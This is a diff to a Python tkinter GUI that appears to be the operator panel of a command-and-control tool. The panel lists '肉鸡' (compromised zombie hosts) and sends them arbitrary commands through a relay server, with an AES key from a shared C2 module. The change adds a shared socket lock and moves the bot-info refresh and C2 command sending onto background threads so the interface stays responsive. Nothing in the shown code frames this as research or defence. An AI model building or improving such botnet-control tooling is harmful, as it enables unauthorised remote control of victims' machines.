@@ -14,6 +14,10 @@ from tkinter.ttk import Combobox
 
 from c2_common import C2_AES_KEY, C2_FRAME_HEADER_LEN
 
+# 串行化 A 端（工具↔server）同一 client socket 上的所有 C2 帧收发（肉鸡刷新 + C2 命令），
+# 避免多条 worker 线程并发 send/recv 导致帧交错失步
+CLIENT_SOCKET_LOCK = threading.Lock()
+
 try:
     from fanyi import *
 except Exception:
@@ -1952,23 +1956,36 @@ def rouji_panel():
     def get_rouji_json_xinxi():
         global rouji_xinxi, rouji_json_xinxi_get
 
-        if config_server_json_null_check():
-            if not rouji_json_xinxi_get:
-                return
-            # 取消已挂起的自动刷新，保证同一时刻只有一条 5s 刷新链
-            if auto_refresh_id[0] is not None:
-                root.after_cancel(auto_refresh_id[0])
-                auto_refresh_id[0] = None
-            # 发送命令和接收命令
-            client.send("rouji_json_xinxi".encode("UTF-8"))
-            # rouji_xinxi = json.loads(client.recv(4096).decode("UTF-8"))
-            rouji_xinxi = json.loads(recv_result(client))
-            # 更新展示
-            update_rouji_xinxi(rouji_xinxi)
-            # 之后每5s 自动进行更新操作（复用同一个定时器 id）
-            auto_refresh_id[0] = root.after(5000, get_rouji_json_xinxi)
-        else:
+        if not config_server_json_null_check():
             messagebox.showinfo("错误","请先进行服务端的连接！\n请将工具箱目录下的server.py文件运行在放在双方都可访问的服务器上\n并配置服务端连接")
+            return
+        if not rouji_json_xinxi_get:
+            return
+        # 取消已挂起的自动刷新，保证同一时刻只有一条 5s 刷新链
+        if auto_refresh_id[0] is not None:
+            root.after_cancel(auto_refresh_id[0])
+            auto_refresh_id[0] = None
+
+        # P1-3: 把阻塞的 send / recv_result 移到 worker 线程，避免卡 UI 主线程；
+        # 与 C2 命令共用模块级 CLIENT_SOCKET_LOCK，避免同一 socket 上的帧交错失步
+        def _refresh_worker():
+            try:
+                with CLIENT_SOCKET_LOCK:
+                    client.send("rouji_json_xinxi".encode("UTF-8"))
+                    new_xinxi = json.loads(recv_result(client))
+            except Exception as e:
+                print(f"肉鸡信息刷新失败: {e}")
+                return
+            root.after(0, lambda nx=new_xinxi: _apply_refresh(nx))
+
+        def _apply_refresh(new_xinxi):
+            global rouji_xinxi
+            rouji_xinxi = new_xinxi
+            update_rouji_xinxi(new_xinxi)
+
+        threading.Thread(target=_refresh_worker, daemon=True).start()
+        # 主线程重排 5s 刷新链（与 worker I/O 解耦，单一链）
+        auto_refresh_id[0] = root.after(5000, get_rouji_json_xinxi)
 
     def popup_menu(event):
         item_id = tree.identify_row(event.y)
@@ -2221,12 +2238,11 @@ def rouji_panel():
 
     # P1-2a: 后台发送 C2 命令并接收结果，避免阻塞 UI 主线程；
     # 结果 / 错误通过 command_line.after(0, ...) 回主线程写回。
-    # c2_cmd_lock 串行化对同一 client socket 的 C2 命令帧收发，避免多命令并发导致协议失步
-    c2_cmd_lock = threading.Lock()
+    # 帧收发串行化由模块级 CLIENT_SOCKET_LOCK 保证（与肉鸡刷新共用同一把锁）
 
     def _run_c2_command(rouji_ID, command, on_result=None, on_error=None):
         def _worker():
-            with c2_cmd_lock:
+            with CLIENT_SOCKET_LOCK:
                 try:
                     client.send(f"{rouji_ID} #> {command}".encode("UTF-8"))
                     result = recv_result(client)
